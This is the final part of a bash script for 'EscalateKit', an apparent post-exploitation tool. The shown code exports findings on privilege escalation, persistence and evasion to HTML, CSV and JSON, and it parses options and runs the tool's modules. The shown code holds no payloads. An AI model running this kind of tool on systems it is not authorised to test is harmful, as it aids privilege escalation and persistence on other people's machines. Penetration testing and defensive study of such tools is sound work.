    if [ -d "$OUTPUT_DIR/evade" ]; then
        echo "    \"evade\": {" >>"$output_file"
        for file in "$OUTPUT_DIR/evade/"*.txt; do
            filename=$(basename "$file" .txt)
            echo "      \"$filename\": $(cat "$file" | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/^/"/;s/$/"/;s/\\n/\\\\n/g')," >>"$output_file"
        done
        # Remove trailing comma from last item
        sed -i '$ s/,$//' "$output_file"
        echo "    }" >>"$output_file"
    fi

    echo "  }" >>"$output_file"
    echo "}" >>"$output_file"

    log_message "INFOS" "JSON export complete: $output_file"
}

# Export results in HTML format
export_html() {
    local output_file="$OUTPUT_DIR/export/results.html"

    log_message "INFOS" "Exporting results to HTML: $output_file"

    # Create HTML header
    cat >"$output_file" <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EscalateKit Results</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f0f0f0; }
        h1 { color: #c00; }
        h2 { color: #900; margin-top: 30px; }
        h3 { color: #600; }
        pre { background-color: #eee; padding: 10px; border-radius: 5px; overflow-x: auto; }
        .module { background-color: white; padding: 15px; margin: 10px 0; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .info { background-color: #dff0d8; padding: 10px; border-radius: 5px; }
        .warning { background-color: #fcf8e3; padding: 10px; border-radius: 5px; }
        .danger { background-color: #f2dede; padding: 10px; border-radius: 5px; }
        .footer { margin-top: 50px; font-size: 12px; color: #666; text-align: center; }
        .highlight { background-color: #ffe0e0; font-weight: bold; }
    </style>
</head>
<body>
    <h1>EscalateKit Results</h1>
    <div class="info">
        <p><strong>Generated:</strong> $(date)</p>
        <p><strong>User:</strong> $(whoami)</p>
        <p><strong>Hostname:</strong> $(hostname)</p>
    </div>
EOF

    # Shell module
    if [ -d "$OUTPUT_DIR/shell" ]; then
        cat >>"$output_file" <<EOF
    <h2>Shell Upgrade</h2>
    <div class="module">
        <h3>Upgrade Options</h3>
        <pre>$(cat "$OUTPUT_DIR/shell/upgrade_options.txt")</pre>
    </div>
EOF
    fi

    # Recon module
    if [ -d "$OUTPUT_DIR/recon" ]; then
        cat >>"$output_file" <<EOF
    <h2>Reconnaissance Results</h2>
EOF

        for file in "$OUTPUT_DIR/recon/"*.txt; do
            filename=$(basename "$file" .txt)
            title=$(echo "$filename" | tr '_' ' ' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)} 1')

            # Read file content and highlight vulnerabilities/findings
            content=$(cat "$file" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')

            cat >>"$output_file" <<EOF
    <div class="module">
        <h3>$title</h3>
        <pre>$content</pre>
    </div>
EOF
        done
    fi

    # Exploit module
    if [ -d "$OUTPUT_DIR/exploit" ]; then
        cat >>"$output_file" <<EOF
    <h2>Exploitation Options</h2>
EOF

        if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
            content=$(cat "$OUTPUT_DIR/exploit/suggestions.txt" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')
            cat >>"$output_file" <<EOF
    <div class="module">
        <h3>Suggested Exploits</h3>
        <pre>$content</pre>
    </div>
EOF
        fi

        if [ -d "$OUTPUT_DIR/exploit/templates" ]; then
            cat >>"$output_file" <<EOF
    <div class="module">
        <h3>Exploit Templates</h3>
        <p>The following exploit templates have been generated:</p>
        <ul>
EOF

            for template in "$OUTPUT_DIR/exploit/templates/"*.sh; do
                if [ -f "$template" ]; then
                    template_name=$(basename "$template")
                    template_desc=$(head -n 2 "$template" | grep -o "# Exploit for.*")
                    cat >>"$output_file" <<EOF
            <li>$template_name - $template_desc</li>
EOF
                fi
            done

            cat >>"$output_file" <<EOF
        </ul>
        <p>These templates can be found in the <code>$OUTPUT_DIR/exploit/templates/</code> directory.</p>
    </div>
EOF
        fi
    fi

    # Persist module
    if [ -d "$OUTPUT_DIR/persist" ]; then
        cat >>"$output_file" <<EOF
    <h2>Persistence Methods</h2>
EOF

        for file in "$OUTPUT_DIR/persist/"*.txt; do
            if [ -f "$file" ]; then
                filename=$(basename "$file" .txt)
                title=$(echo "$filename" | tr '_' ' ' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)} 1')
                content=$(cat "$file" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')

                cat >>"$output_file" <<EOF
    <div class="module">
        <h3>$title</h3>
        <pre>$content</pre>
    </div>
EOF
            fi
        done
    fi

    # Evade module
    if [ -d "$OUTPUT_DIR/evade" ]; then
        cat >>"$output_file" <<EOF
    <h2>Evasion Techniques</h2>
EOF

        for file in "$OUTPUT_DIR/evade/"*.txt; do
            if [ -f "$file" ]; then
                filename=$(basename "$file" .txt)
                title=$(echo "$filename" | tr '_' ' ' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)} 1')
                content=$(cat "$file" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')

                cat >>"$output_file" <<EOF
    <div class="module">
        <h3>$title</h3>
        <pre>$content</pre>
    </div>
EOF
            fi
        done
    fi

    # Add a summary section
    if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
        cat >>"$output_file" <<EOF
    <h2>Summary</h2>
    <div class="module danger">
        <h3>Privilege Escalation Vectors</h3>
        <ul>
EOF

        grep -E "\[+\]|([0-9]+\. .*escalation)" "$OUTPUT_DIR/exploit/suggestions.txt" | while read -r line; do
            # Highlight the line
            formatted_line=$(echo "$line" | sed 's/\[+\]/<span class="highlight">[+]<\/span>/g')
            cat >>"$output_file" <<EOF
            <li>$formatted_line</li>
EOF
        done

        cat >>"$output_file" <<EOF
        </ul>
    </div>
EOF
    fi

    # HTML footer
    cat >>"$output_file" <<EOF
    <div class="footer">
        <p>Generated by EscalateKit - v1.0</p>
        <p>Date: $(date)</p>
    </div>
</body>
</html>
EOF

    log_message "INFOS" "HTML export complete: $output_file"
}

# Export results in CSV format
export_csv() {
    local output_file="$OUTPUT_DIR/export/results.csv"

    log_message "INFOS" "Exporting results to CSV: $output_file"

    # Create CSV header
    echo "Module,Category,Finding,Description" >"$output_file"

    # Shell module
    if [ -d "$OUTPUT_DIR/shell" ]; then
        while IFS= read -r line; do
            if [[ "$line" == *"[+"* ]]; then
                # This is a finding
                echo "Shell,Upgrade,\"$line\",\"Available shell upgrade method\"" >>"$output_file"
            fi
        done <"$OUTPUT_DIR/shell/upgrade_options.txt"
    fi

    # Recon module
    if [ -d "$OUTPUT_DIR/recon" ]; then
        for file in "$OUTPUT_DIR/recon/"*.txt; do
            category=$(basename "$file" .txt | tr '_' ' ')

            while IFS= read -r line; do
                if [[ "$line" == *"[+"* ]]; then
                    # Extract just the finding part from the line
                    finding=$(echo "$line" | sed 's/\[+\]//')
                    description="Potential security issue"

                    # Customize description based on category
                    case "$category" in
                    "sudo_privs")
                        description="Potentially exploitable sudo permission"
                        ;;
                    "suid_files")
                        description="SUID binary that could be exploited"
                        ;;
                    "capabilities")
                        description="Dangerous capability set"
                        ;;
                    "cron_jobs")
                        description="Writable cron job that could be modified"
                        ;;
                    "writable_files")
                        description="Critical writable file or directory"
                        ;;
                    "kernel_exploits")
                        description="Potential kernel vulnerability"
                        ;;
                    esac

                    echo "Recon,$category,\"$finding\",\"$description\"" >>"$output_file"
                fi
            done <"$file"
        done
    fi

    # Exploit module
    if [ -d "$OUTPUT_DIR/exploit" ]; then
        if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
            while IFS= read -r line; do
                if [[ "$line" == *"[+"* ]]; then
                    echo "Exploit,Suggestion,\"$line\",\"Potential exploit vector\"" >>"$output_file"
                elif [[ "$line" =~ ^[0-9]+\. ]]; then
                    # This is a priority item
                    echo "Exploit,Priority,\"$line\",\"Exploit priority\"" >>"$output_file"
                fi
            done <"$OUTPUT_DIR/exploit/suggestions.txt"
        fi

        # Add exploit templates
        if [ -d "$OUTPUT_DIR/exploit/templates" ]; then
            for template in "$OUTPUT_DIR/exploit/templates/"*.sh; do
                if [ -f "$template" ]; then
                    template_name=$(basename "$template")
                    template_desc=$(head -n 2 "$template" | grep -o "# Exploit for.*")
                    echo "Exploit,Template,\"$template_name\",\"$template_desc\"" >>"$output_file"
                fi
            done
        fi
    fi

    # Persist module
    if [ -d "$OUTPUT_DIR/persist" ]; then
        for file in "$OUTPUT_DIR/persist/"*.txt; do
            if [ -f "$file" ]; then
                category=$(basename "$file" .txt | tr '_' ' ')

                while IFS= read -r line; do
                    if [[ "$line" == *"[+"* ]]; then
                        echo "Persist,$category,\"$line\",\"Persistence mechanism\"" >>"$output_file"
                    fi
                done <"$file"
            fi
        done
    fi

    # Evade module
    if [ -d "$OUTPUT_DIR/evade" ]; then
        for file in "$OUTPUT_DIR/evade/"*.txt; do
            if [ -f "$file" ]; then
                category=$(basename "$file" .txt | tr '_' ' ')

                while IFS= read -r line; do
                    if [[ "$line" == *"[+"* ]]; then
                        echo "Evade,$category,\"$line\",\"Evasion technique\"" >>"$output_file"
                    fi
                done <"$file"
            fi
        done
    fi

    log_message "INFOS" "CSV export complete: $output_file"
    echo "[+] You can open this CSV file in any spreadsheet application for further analysis"
}

# Restore default configuration
restore_defaults() {
    log_message "INFOS" "Restoring default configuration"

    # Reset output and log directories
    OUTPUT_DIR="$DEFAULT_OUTPUT_DIR"
    LOG_DIR="/tmp/.escalatekit_logs"
    LOGFILE="$LOG_DIR/history.log"

    # Clean up any artifacts
    rm -rf "$OUTPUT_DIR" 2>/dev/null
    rm -rf "$LOG_DIR" 2>/dev/null

    # Create default directories
    mkdir -p "$OUTPUT_DIR" 2>/dev/null
    mkdir -p "$LOG_DIR" 2>/dev/null

    log_message "INFOS" "Default configuration restored"
}

# ----------------------------------------------------------------------
# Main Script Execution
# ----------------------------------------------------------------------

# Display banner if not in quiet mode
# Display banner if not in quiet mode
if [ "$QUIET_MODE" = false ]; then
    echo -e "\e[1;31m"
    echo "███████╗███████╗ ██████╗ █████╗ ██╗      █████╗ ████████╗███████╗██╗  ██╗██╗████████╗"
    echo "██╔════╝██╔════╝██╔════╝██╔══██╗██║     ██╔══██╗╚══██╔══╝██╔════╝██║ ██╔╝██║╚══██╔══╝"
    echo "█████╗  ███████╗██║     ███████║██║     ███████║   ██║   █████╗  █████╔╝ ██║   ██║   "
    echo "██╔══╝  ╚════██║██║     ██╔══██║██║     ██╔══██║   ██║   ██╔══╝  ██╔═██╗ ██║   ██║   "
    echo "███████╗███████║╚██████╗██║  ██║███████╗██║  ██║   ██║   ███████╗██║  ██╗██║   ██║   "
    echo "╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝   "
    echo -e "\e[0m"
    echo -e "\e[1;32mPost-Exploitation Automation Tool v$VERSION\e[0m"
    echo -e "\e[1;34mAuthor: K4YR0\e[0m"
    
    # Show current user status instead of root status
    current_user=$(whoami)
    current_uid=$(id -u)
    
    if [ "$current_uid" -eq 0 ]; then
        echo -e "\e[1;33m[!] Currently running as ROOT - privilege escalation not needed\e[0m"
    else
        echo -e "\e[1;32m[+] Running as user: $current_user (UID: $current_uid) - ready for privilege escalation\e[0m"
    fi
    
    echo -e "\e[0m"
    echo "========================================================================"
    echo ""
fi

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case "$1" in
    -h | --help)
        display_help
        exit $E_SUCCESS
        ;;
    -f | --fork)
        PARALLEL_MODE="fork"
        shift
        ;;
    -t | --thread)
        PARALLEL_MODE="thread"
        shift
        ;;
    -s | --subshell)
        PARALLEL_MODE="subshell"
        shift
        ;;
    -l | --log)
        if [[ -z "$2" || "$2" == -* ]]; then
            log_message "ERROR" "Option -l requires a directory parameter"
            exit $E_MISSING_PARAM
        fi
        LOG_DIR="$2"
        LOGFILE="$LOG_DIR/history.log"
        shift 2
        ;;
    -r | --restore)
        restore_defaults
        exit $E_SUCCESS
        ;;
    -v | --verbose)
        VERBOSE=true
        shift
        ;;
    -m | --modules)
        if [[ -z "$2" || "$2" == -* ]]; then
            log_message "ERROR" "Option -m requires a module list parameter"
            exit $E_MISSING_PARAM
        fi
        MODULES_TO_RUN="$2"
        shift 2
        ;;
    -o | --output)
        if [[ -z "$2" || "$2" == -* ]]; then
            log_message "ERROR" "Option -o requires a format parameter"
            exit $E_MISSING_PARAM
        fi
        EXPORT_FORMAT="$2"
        shift 2
        ;;
    -q | --quiet)
        QUIET_MODE=true
        shift
        ;;
    -*)
        log_message "ERROR" "Unknown option: $1"
        display_help
        exit $E_OPTION_NOT_EXIST
        ;;
    *)
        # Assume the first non-option argument is the target directory
        TARGET_DIR="$1"
        shift
        ;;
    esac
done



# Create output directory if it doesn't exist
mkdir -p "$OUTPUT_DIR" 2>/dev/null
if [ $? -ne 0 ]; then
    log_message "ERROR" "Cannot create output directory: $OUTPUT_DIR"
    exit $E_PERMISSION_DENIED
fi

# Create log directory if it doesn't exist
mkdir -p "$LOG_DIR" 2>/dev/null
if [ $? -ne 0 ]; then
    log_message "ERROR" "Cannot create log directory: $LOG_DIR"
    exit $E_PERMISSION_DENIED
fi

# Parse modules to run
if [ "$MODULES_TO_RUN" = "all" ]; then
    modules=("shell" "recon" "exploit" "persist" "evade")
else
    # Split the modules by comma
    IFS=',' read -ra modules <<<"$MODULES_TO_RUN"
fi

# Check if any modules are specified
if [ ${#modules[@]} -eq 0 ]; then
    log_message "ERROR" "No modules specified"
    display_help
    exit $E_MISSING_PARAM
fi

# Run modules based on selected parallel mode
case "$PARALLEL_MODE" in
"fork")
    run_with_fork "${modules[@]}"
    ;;
"thread")
    run_with_thread "${modules[@]}"
    ;;
"subshell")
    run_with_subshell "${modules[@]}"
    ;;
*)
    # Default to sequential execution if no parallel mode specified
    log_message "INFOS" "Running modules in sequential mode"
    for module in "${modules[@]}"; do
        run_module "$module"
    done
    ;;
esac

# Export results if format specified
if [ -n "$EXPORT_FORMAT" ]; then
    # Split the export format string by comma
    IFS=',' read -ra formats <<<"$EXPORT_FORMAT"
    for format in "${formats[@]}"; do
        export_results "$format"
    done
fi

# Display summary
if [ "$QUIET_MODE" = false ]; then
    echo ""
    echo "========================================"
    echo "EscalateKit Execution Summary"
    echo "========================================"
    echo "Modules run: ${modules[*]}"
    echo "Results saved to: $OUTPUT_DIR"
    echo ""

    # Check if we found any potential escalation vectors
    if [ -f "$OUTPUT_DIR/exploit/suggestions.txt" ]; then
        echo "Potential Privilege Escalation Vectors:"
        grep -A 1 "\[+\]" "$OUTPUT_DIR/exploit/suggestions.txt" | grep -v -- "--"
        echo ""
        echo "For detailed results, check the output directory or run with -o option to export results."
    fi
fi

log_message "INFOS" "EscalateKit execution completed successfully"
exit $E_SUCCESS
